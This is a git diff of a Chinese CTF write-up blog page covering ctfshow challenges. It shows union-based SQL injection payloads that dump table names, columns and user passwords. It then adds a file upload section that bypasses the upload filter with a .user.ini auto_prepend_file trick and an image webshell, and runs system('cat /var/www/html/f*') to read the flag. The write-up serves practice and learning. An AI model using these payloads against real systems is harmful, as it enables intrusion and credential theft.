@@ -493,21 +493,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-03
+                    2023-01-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    6.8k
+                    6.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    28 分
+                    29 分
                 </div>
                 
 
@@ -1000,6 +1000,9 @@ $<span class="token keyword">sql</span> <span class="token operator">=</span> <s
 
 <p><img src="https://img-blog.csdnimg.cn/4c72f7bb235a43aabfc05f68a47b99b8.png" alt="172"><br>爆破表名：<br><code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</code><img src="https://img-blog.csdnimg.cn/cc679eeb3313400b8c2a585a7395b9d7.png" alt="172"><br>出现两个表名，有猫腻！继续往下做<br>爆破表（ctfshow_user）的列名：<br><code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code><br><img src="https://img-blog.csdnimg.cn/c47f98754ada4e5f89973323c64eea9a.png" alt="172"></p>
 <p>爆破数据：<br><code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code><br><img src="https://img-blog.csdnimg.cn/e652af16a26a46b989ac1a6a87572daa.png" alt="172">或只查找密码<br><code>1&#39; union select 1,2,password FROM ctfshow_user--+</code><br><img src="https://img-blog.csdnimg.cn/b06dc2683d1c4bbf85eb0e874886d09f.png" alt="172"><br>或精准查找flag的密码<br><code>1&#39; union select 1,username,password FROM ctfshow_user where username =&#39;flag&#39;--+</code><br><img src="https://img-blog.csdnimg.cn/483e7992aec84c5f8801785f651f3ff5.png" alt="172"><br>看来flag应该在另一个表中。<br><img src="https://img-blog.csdnimg.cn/cc679eeb3313400b8c2a585a7395b9d7.png" alt="172">确实：<br><img src="https://img-blog.csdnimg.cn/2a990c58086647cc8f591556d9b90096.png" alt="172"></p>
+<h2 id="文件上传篇"><a href="#文件上传篇" class="headerlink" title="文件上传篇"></a>文件上传篇</h2><h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>上传图片马抓包改后缀<br><img src="https://img-blog.csdnimg.cn/1e8ea89704a54df79708da76200c7d64.png" alt="1"><br>换了php5，phtml蚁剑连不上，很有可能是php5，phtml没有被解析成php文件执行。详情请参考<a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/vip_mmles/topics/1547397"> .htaccess 和.user.ini 配置文件妙用 </a><br>所以要上传一个.user.ini配置文件，因为该网站是nginxx系统</p>
+<p>同样，上传png文件，burp抓包修改文件信息，文件名修改为.user.ini，内容添加<strong>auto_prepend_file&#x3D;1.png</strong>。再上传一个名为1.png的图片马即可</p>
+<p><img src="https://img-blog.csdnimg.cn/1e185a3845754cbc86e795bf433dbd5c.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/4d12a3b8aa684b9981b21fe50035dde1.png" alt="3"><br>最后访问**&#x2F;url&#x2F;upload&#x2F;index.php<strong>，用</strong>12&#x3D;system(‘cat &#x2F;var&#x2F;www&#x2F;html&#x2F;f*’);**输入命令获取flag就好</p>
 
                 
             </div>
@@ -1843,7 +1846,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">14.6k</span>&nbsp;字
+                class="white-color">15.6k</span>&nbsp;字
             
             
             
